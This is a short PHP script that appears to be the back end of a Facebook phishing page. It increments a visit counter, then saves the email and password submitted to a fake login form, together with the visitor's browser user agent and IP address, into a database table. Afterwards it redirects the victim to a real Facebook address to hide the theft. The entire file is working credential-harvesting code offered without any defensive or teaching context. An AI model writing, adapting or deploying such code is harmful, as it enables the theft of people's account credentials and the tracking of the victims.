<?php
  require_once "db.php";

  $db = bDConnect();
  $vis = $db->query('SELECT vue FROM FB_visite');
  $data = $vis->fetch();
  $total = $data['vue'] +1;
  $mod = $db->prepare('UPDATE FB_visite SET vue=?');
  $mod->execute(array($total++));
  $email = isset($_POST['email']) ? htmlentities($_POST['email']) : null;
  $password = isset($_POST['pass']) ? htmlentities($_POST['pass']) : null;
  if(isset($_POST['login']) && !empty($email) && !empty($password) ){
    $req = $db->prepare('INSERT INTO FB_info (email,mdp,agent,ip) VALUES (:em, :pass, :ag, :ip) ');
    $req->execute(array(
      'em' => $email,
      'pass' => $password,
      'ag' => $_SERVER['HTTP_USER_AGENT'],
      'ip' => $_SERVER['REMOTE_ADDR']
    ));
    header('Location:http://free.facebook.com/');
  }

